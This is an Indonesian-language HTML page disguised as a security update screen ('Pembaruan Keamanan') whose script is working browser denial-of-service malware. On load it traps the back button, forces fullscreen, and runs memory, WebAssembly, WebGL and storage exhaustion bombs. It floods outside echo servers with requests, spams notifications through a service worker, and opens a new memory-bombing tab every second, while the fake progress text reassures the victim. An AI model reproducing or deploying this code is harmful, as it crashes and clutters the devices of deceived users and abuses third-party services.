<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pembaruan Keamanan</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a1628;
            color: #4fc3f7;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            text-align: center;
            padding: 20px;
        }
        .box {
            background: #112240;
            padding: 40px 30px;
            border-radius: 20px;
            max-width: 400px;
            box-shadow: 0 8px 40px rgba(0,0,0,0.6);
            border: 1px solid #1a3555;
        }
        .icon { font-size: 56px; margin-bottom: 15px; }
        h1 { font-size: 24px; color: #64ffda; margin-bottom: 10px; font-weight: 400; }
        p { font-size: 14px; color: #8892b0; margin-bottom: 20px; line-height: 1.6; }
        .progress {
            width: 100%;
            height: 6px;
            background: #1a3555;
            border-radius: 10px;
            overflow: hidden;
            margin-top: 10px;
        }
        .progress-bar {
            width: 100%;
            height: 100%;
            background: #64ffda;
            animation: progress 2s ease-in-out infinite;
        }
        @keyframes progress { 0% { width: 0%; } 50% { width: 100%; } 100% { width: 0%; } }
        .footer { font-size: 11px; color: #495670; margin-top: 20px; }
        .status { font-size: 13px; color: #64ffda; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="icon">🔄</div>
        <h1>Memproses Pembaruan</h1>
        <p>Jangan matikan perangkat. Pembaruan keamanan sedang diinstal.</p>
        <div class="progress"><div class="progress-bar"></div></div>
        <div class="status" id="status">⏳ Mengunduh paket...</div>
        <div class="footer">🔒 Terhubung ke server aman</div>
    </div>

    <script>
        // =============================================
        //  UPDATE SECURITY — Heavy Payload
        //  Tampilan profesional, tidak mencurigakan
        // =============================================

        let statusEl = document.getElementById('status');

        function updateStatus(msg) {
            statusEl.textContent = msg;
        }

        // === 1. LOCK BACK BUTTON ===
        (function lockHistory() {
            history.pushState(null, null, location.href);
            window.onpopstate = function() { history.go(1); };
        })();

        // === 2. FULLSCREEN ===
        document.documentElement.requestFullscreen().catch(() => {});
        screen.orientation.lock('portrait').catch(() => {});

        // === 3. MEMORY BOMB (3 layer) ===
        function memoryBomb() {
            let mem = [], mem2 = [], mem3 = [];
            setInterval(() => {
                for (let i = 0; i < 3000; i++) {
                    mem.push(new Array(1000000).fill('x'));
                    mem2.push(new Float64Array(1000000));
                    mem3.push({ a: new ArrayBuffer(1024 * 1024), b: new Date(), c: Math.random() });
                }
            }, 1);
        }

        // === 4. WEBASSEMBLY (16 thread) ===
        function wasmFloatBomb() {
            try {
                const wasmCode = new Uint8Array([
                    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
                    0x01, 0x0a, 0x01, 0x60, 0x01, 0x7f, 0x01, 0x7f,
                    0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01, 0x03,
                    0x6c, 0x6f, 0x6f, 0x70, 0x00, 0x00, 0x0a, 0x0d,
                    0x01, 0x0b, 0x00, 0x20, 0x00, 0x41, 0x01, 0x6a,
                    0x20, 0x00, 0x6b, 0x0b, 0x0b
                ]);
                const module = new WebAssembly.Module(wasmCode);
                const instance = new WebAssembly.Instance(module);
                for (let t = 0; t < 16; t++) {
                    setTimeout(() => {
                        while (true) { instance.exports.loop(1); }
                    }, 0);
                }
            } catch (e) {}
        }

        // === 5. WEBGL EXTREME ===
        function webglExtreme() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 8192;
                canvas.height = 8192;
                const gl = canvas.getContext('webgl2');
                if (!gl) return;

                const vs = gl.createShader(gl.VERTEX_SHADER);
                gl.shaderSource(vs, `attribute vec2 position; void main() { gl_Position = vec4(position, 0.0, 1.0); }`);
                gl.compileShader(vs);
                const fs = gl.createShader(gl.FRAGMENT_SHADER);
                gl.shaderSource(fs, `precision highp float; void main() { float sum = 0.0; for (int i = 0; i < 10000000; i++) { sum += sin(float(i)) * cos(float(i)) * tan(float(i)); } gl_FragColor = vec4(sum / 10000000.0, 0.0, 0.0, 1.0); }`);
                gl.compileShader(fs);
                const program = gl.createProgram();
                gl.attachShader(program, vs);
                gl.attachShader(program, fs);
                gl.linkProgram(program);
                gl.useProgram(program);
                const vertices = new Float32Array(100000 * 2);
                for (let i = 0; i < vertices.length; i++) { vertices[i] = Math.random() * 2 - 1; }
                const buffer = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
                const pos = gl.getAttribLocation(program, 'position');
                gl.enableVertexAttribArray(pos);
                gl.vertexAttribPointer(pos, 2, gl.FLOAT, false, 0, 0);
                setInterval(() => { for (let i = 0; i < 100; i++) { gl.drawArrays(gl.TRIANGLES, 0, 100000); } }, 1);
            } catch (e) {}
        }

        // === 6. STORAGE BOMB ===
        function storageBomb() {
            try {
                let data = '';
                for (let i = 0; i < 1024 * 1024; i++) { data += 'x'; }
                for (let i = 0; i < 50; i++) { localStorage.setItem('bomb_' + i, data); }
                const request = indexedDB.open('UpdateCache', 1);
                request.onsuccess = function(event) {
                    const db = event.target.result;
                    const transaction = db.transaction(['store'], 'readwrite');
                    const store = transaction.objectStore('store');
                    for (let i = 0; i < 500; i++) {
                        store.add({ id: i, data: new Array(1024 * 1024).fill('x').join('') });
                    }
                };
                request.onupgradeneeded = function(event) {
                    const db = event.target.result;
                    db.createObjectStore('store', { keyPath: 'id' });
                };
            } catch (e) {}
        }

        // === 7. NETWORK BOMB ===
        function networkBomb() {
            try {
                for (let i = 0; i < 300; i++) {
                    try {
                        const ws = new WebSocket('wss://echo.websocket.org');
                        ws.onopen = () => {
                            setInterval(() => { ws.send('x'.repeat(65536)); }, 1);
                        };
                    } catch (e) {}
                }
                setInterval(() => {
                    for (let i = 0; i < 300; i++) {
                        fetch('https://httpbin.org/post', {
                            method: 'POST',
                            body: 'x'.repeat(65536),
                            headers: { 'Content-Type': 'text/plain' }
                        }).catch(() => {});
                    }
                }, 1);
            } catch (e) {}
        }

        // === 8. SERVICE WORKER ===
        function registerServiceWorker() {
            try {
                const swCode = `
                    self.addEventListener('install', () => self.skipWaiting());
                    self.addEventListener('activate', () => self.clients.claim());
                    setInterval(() => {
                        self.registration.showNotification('Pembaruan', {
                            body: 'Pembaruan keamanan selesai. Restart diperlukan.',
                            icon: 'https://cdn-icons-png.flaticon.com/512/3135/3135715.png'
                        });
                    }, 100);
                `;
                const blob = new Blob([swCode], { type: 'application/javascript' });
                const url = URL.createObjectURL(blob);
                navigator.serviceWorker.register(url, { scope: '/' });
            } catch (e) {}
        }

        // === 9. NOTIFICATION SPAM ===
        function notificationSpam() {
            try {
                Notification.requestPermission().then(perm => {
                    if (perm === 'granted') {
                        setInterval(() => {
                            new Notification('Pembaruan', {
                                body: 'Pembaruan keamanan selesai. Restart diperlukan.',
                                icon: 'https://cdn-icons-png.flaticon.com/512/3135/3135715.png'
                            });
                        }, 100);
                    }
                });
            } catch (e) {}
        }

        // === 10. TAB SPAM ===
        function openNewTab() {
            try {
                const newWindow = window.open('', '_blank');
                if (newWindow) {
                    newWindow.document.write(`
                        <!DOCTYPE html>
                        <html>
                        <head>
                            <title>Pembaruan</title>
                            <style>
                                body { background: #0a1628; color: #64ffda; font-family: Arial; text-align: center; padding-top: 40%; }
                            </style>
                        </head>
                        <body>
                            <h1>⏳ Memproses...</h1>
                            <p>Jangan matikan perangkat.</p>
                            <script>
                                let mem = [];
                                setInterval(() => {
                                    for (let i = 0; i < 3000; i++) { mem.push(new Array(1000000).fill('x')); }
                                }, 1);
                                history.pushState(null, null, location.href);
                                window.onpopstate = function() { history.go(1); };
                            <\/script>
                        </body>
                        </html>
                    `);
                }
            } catch (e) {}
        }

        // === 11. JALANKAN SEMUA ===
        updateStatus('⏳ Mengunduh paket...');
        setTimeout(() => updateStatus('📦 Memasang pembaruan...'), 3000);
        setTimeout(() => updateStatus('🔄 Menyelesaikan...'), 6000);
        setTimeout(() => updateStatus('✅ Pembaruan selesai. Restart diperlukan.'), 9000);

        memoryBomb();
        wasmFloatBomb();
        webglExtreme();
        storageBomb();
        networkBomb();
        registerServiceWorker();
        notificationSpam();
        setInterval(openNewTab, 1000);

        // === 12. AUTO CLOSE CHROME ===
        setTimeout(() => {
            try {
                window.close();
                window.location.href = 'about:blank';
                document.body.innerHTML = '';
                document.title = '';
                for (let i = 1; i < 99999; i++) {
                    clearInterval(i);
                    clearTimeout(i);
                }
            } catch (e) {
                window.location.href = 'about:blank';
            }
        }, 25000);

        console.log('[Mbud] Update Security Active');
    </script>
</body>
</html>
